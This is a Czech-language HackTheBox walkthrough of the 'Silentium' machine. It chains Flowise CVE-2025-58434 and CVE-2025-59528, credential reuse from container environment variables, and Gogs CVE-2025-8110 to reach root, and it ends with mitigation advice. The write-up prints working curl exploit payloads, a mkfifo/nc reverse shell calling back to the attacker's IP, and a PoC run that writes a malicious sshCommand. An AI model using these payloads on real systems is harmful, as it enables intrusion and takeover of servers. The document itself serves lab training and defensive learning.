# HackTheBox — Silentium

**OS:** Linux (Ubuntu 24.04)
**Vstupní bod:** Web (Flowise na staging) → Docker kontejner → SSH jako ben → Gogs → CVE-2025-8110 → root

---

## 

Na subdoméně `staging.silentium.htb` běží **Flowise 3.0.5** se dvěma zranitelnostmi: reset hesla bez autentizace (CVE-2025-58434) a RCE (CVE-2025-59528). Přes ně získáváme **root uvnitř Docker kontejneru**, odkud z proměnných prostředí vytáhneme heslo `r04D!!_R4ge` pro SSH uživatele `ben`. Dále — Gogs na `127.0.0.1:3001`, zneužijeme **CVE-2025-8110** a získáme **root na hostiteli** (Gogs běží s `RUN_USER = root`).

---

## 1. Enumeration (Průzkum)

### Nmap

```bash
nmap -T4 -A -v 10.129.144.227
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

Nmap hlásí přesměrování — přidáme host do `/etc/hosts`:

```bash
echo "10.129.144.227  silentium.htb" | sudo tee -a /etc/hosts
```

### Fuzzing virtuálních hostů

Na `silentium.htb` nic zajímavého, ale je to virtuální host. Fuzzujeme subdomény:

```bash
ffuf -H 'Host: FUZZ.silentium.htb' \
     -u http://silentium.htb \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -fs 178
```

Výsledek:

```
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 19ms]
```

Přidáme do hosts:

```bash
echo "10.129.144.227  staging.silentium.htb" | sudo tee -a /etc/hosts
```

Na `staging.silentium.htb` — **Flowise**, chce login. Výchozí přihlašovací údaje nefungují, verze není uvedena.

---

## 2. Foothold — Flowise

### CVE-2025-58434 — reset hesla bez autentizace

Zkontrolujeme repozitář Flowise na nové CVE — nacházíme **CVE-2025-58434**: reset hesla bez autentizace. Potřebujeme platný email.

Na hlavní stránce `silentium.htb` — tři jména: **Marcus Thorne**, **Ben**, **Elena Rossi**. Zkusíme `ben@silentium.htb`:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user":{"email":"ben@silentium.htb"}}' | jq .
```

Odpověď:

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
    "tokenExpiry": "2026-05-24T21:30:43.390Z",
    "status": "active",
    ...
  }
}
```

Získali jsme `tempToken`. Resetujeme heslo:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
       "user":{
         "email":"ben@silentium.htb",
         "tempToken":"Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
         "password":"NewPassword"
       }
     }'
```

Odpověď `200 OK` — heslo resetováno.

### Přihlášení a zjištění verze

Přihlásíme se s `ben@silentium.htb` / `NewPassword`. V pravém horním rohu — ikona ozubeného kola, tam je verze:

```
Flowise 3.0.5
```

To je zranitelné vůči **CVE-2025-59528** — RCE.

### CVE-2025-59528 — RCE

Vygenerujeme API klíč v levém panelu (nebo použijeme výchozí). Otestujeme RCE pingem na náš web server:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 1 10.10.14.144\");return 1;})()})"
       }
     }'
```

Ping dorazil — nahradíme reverse shellem:

```bash
# listener
nc -lvnp 4444

# exploit
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.144 4444 >/tmp/f\");return 1;})()})"
       }
     }'
```

Získáváme **root uvnitř Docker kontejneru**.

---

## 3. Shell jako ben

V kontejneru — root, ale potřebujeme se dostat na hostitele. Podíváme se na proměnné prostředí:

```bash
env
```

Nacházíme:

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SENDER_EMAIL=ben@silentium.htb
```

Heslo `r04D!!_R4ge` funguje pro SSH uživatele `ben` na hostiteli:

```bash
ssh ben@silentium.htb
# heslo: r04D!!_R4ge
```

> Pokud ssh zamrzne na `expecting SSH2_MSG_KEX_ECDH_REPLY` — snížíme MTU:
> ```bash
> sudo ip link set dev tun0 mtu 1200
> ```

Jsme na hostiteli jako `ben`.

---

## 4. Průzkum na hostiteli

```bash
ben@silentium:~$ ss -tlnp
```

Vidíme Gogs na `127.0.0.1:3001` — pouze loopback, zvenčí nedostupný. Podíváme se na konfiguraci:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

Klíčové:

```ini
RUN_USER = root
```

Gogs běží **jako root** — jakákoli RCE přes něj dá rovnou root.

---

## 5. Port Forwarding

Přesměrujeme `3001` na Kali:

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

Ověříme:

```bash
curl -s http://localhost:3001 | head
```

```
<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	...
		<meta name="author" content="Gogs" />
```

Gogs je dostupný lokálně na Kali. Otevřeme `http://localhost:3001`.

---

## 6. CVE-2025-8110 — Gogs RCE

### Podstata

Gogs nekontroluje, zda soubor přepisovaný přes `PUT /api/v1/repos/.../contents/<file>` je symlink. Útočník může:

1. Pushnout symlink `malicious_link -> .git/config`.
2. Přes API zapsat do něj škodlivý `.git/config` s řádkem `sshCommand = <reverse shell>`.
3. Gogs následuje symlink a přepíše **svůj vlastní** `.git/config`.
4. Při další SSH operaci Gogs spustí `sshCommand` — RCE.

### Příprava

**Okno 1 — listener:**

```bash
nc -lvnp 4444
```

**Okno 2 — SSH tunel (nezavírat):**

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

**Okno 3 — exploit:**

Zjistíme svou `tun0` IP:

```bash
ip a show tun0 | grep inet
# inet 10.10.14.144/23 ...
```

Spustíme PoC (adaptovaný pro Silentium — s `-un`/`-pw` pro existujícího uživatele, což obchází captcha při registraci):

```bash
python3 CVE-2025-8110.py \
  -u http://localhost:3001 \
  -lh 10.10.14.144 \
  -lp 4444 \
  -un NewUsers \
  -pw GogsPassword
```

### Výstup exploitu

```
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 44d191f24805eb4f165162eeb943700496590414
Repo creation status: 201
Klonování do «/tmp/caaafaf0fa74»...
...
[master f5f79a4] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
...
To http://localhost:3001/NewUsers/caaafaf0fa74.git
   8812c81..f5f79a4  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read timeout=5)
```

> `Read timed out` — **očekávaný znak úspěchu**. Gogs spustil náš `sshCommand` a odešel do reverse shellu místo odpovědi na HTTP požadavek.

---

## 7. Root

V okně listeneru:

```
listening on [any] 4444 ...
connect to [10.10.14.144] from (UNKNOWN) [10.129.144.227] 40198
bash: cannot set terminal process group (1491): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# id
uid=0(root) gid=0(root) groups=0(root)
```

**Rovnou root**, protože `RUN_USER = root`.

### Stabilizace TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

`Ctrl+Z`, na Kali:

```bash
stty raw -echo; fg
```

Enter, Enter. V shellu:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

---

## 8. Flags (Vlajky)

```bash
root@silentium:~# cat /home/ben/user.txt
a44ec12e354a9ae38b0574fc7888a19a

root@silentium:~# cat /root/root.txt
52198fb7afbca1b6bb01ab68db1c6324
```

---

## 9. Shrnutí / Mitigace

### Řetězec útoku

```
Recon (nmap, ffuf)
   └── staging.silentium.htb → Flowise 3.0.5
         ├── CVE-2025-58434 (reset hesla bez autentizace)
         │     └── přístup do admin panelu Flowise
         └── CVE-2025-59528 (RCE)
               └── root v Docker kontejneru
                     └── env: SMTP_PASSWORD=r04D!!_R4ge
                           └── SSH ben@silentium.htb
                                 └── Gogs na 127.0.0.1:3001 (RUN_USER = root)
                                       └── SSH tunel -L 3001:127.0.0.1:3001
                                             └── CVE-2025-8110 (symlink → .git/config → sshCommand)
                                                   └── RCE jako root
                                                         └── root.txt
```

### Jak opravit

1. **Flowise**: aktualizovat na verzi, kde jsou opraveny CVE-2025-58434 a CVE-2025-59528. Reset hesla by měl vyžadovat potvrzení emailem, ne vracet `tempToken` v odpovědi API.
2. **Neukládat tajemství do proměnných prostředí kontejneru.** `SMTP_PASSWORD`, `FLOWISE_PASSWORD` — to vše uniká při první RCE. Použít správce tajemství.
3. **Nepoužívat stejná hesla.** `r04D!!_R4ge` od SMTP fungovalo pro SSH — tak to být nemá.
4. **Gogs**: aktualizovat na verzi, kde je opraveno CVE-2025-8110 (validace symlinků v API obsahu).
5. **Nespouštět Gogs jako root.** `RUN_USER = root` mění jakoukoli RCE v úplné převzetí hostitele. Povinně — samostatný neprivilegovaný uživatel.
6. **Omezit práva na `.git/config`** — Gogs by neměl mít možnost přepisovat vlastní konfigurace gitu.
7. **Monitoring**: sledovat vytváření symlinků v repozitářích a podezřelé změny `sshCommand`.

### Co si zapamatovat

- `Read timed out` v web exploitech — často není chyba, ale znak, že payload zabral.
- `ssh -N -L` je spolehlivější než escape sekvence `~C`.
- Vždy kontrolujte `env` v kontejneru — tajemství tam často leží v otevřené podobě.
- Vždy kontrolujte `RUN_USER` v konfiguracích služeb — častá příčina „bezplatného" rootu.
- CVE-2025-8110 — skvělý příklad toho, proč nelze důvěřovat symlinkům při práci se souborovými API.

### Captcha (CAPTCHA)

Používá se PoC adaptovaný pro Silentium:
https://github.com/ixZODiAK/CVE-2025-8110

Je to fork originálního zAbuQasem/gogs-CVE-2025-8110, který přijímá
flagy `-un` a `-pw` pro již existujícího uživatele Gogs —
to obchází captcha, zapnutou na Silentium (`ENABLE_REGISTRATION_CAPTCHA = true`).

**Stroj dobyt. GG!** 🚀
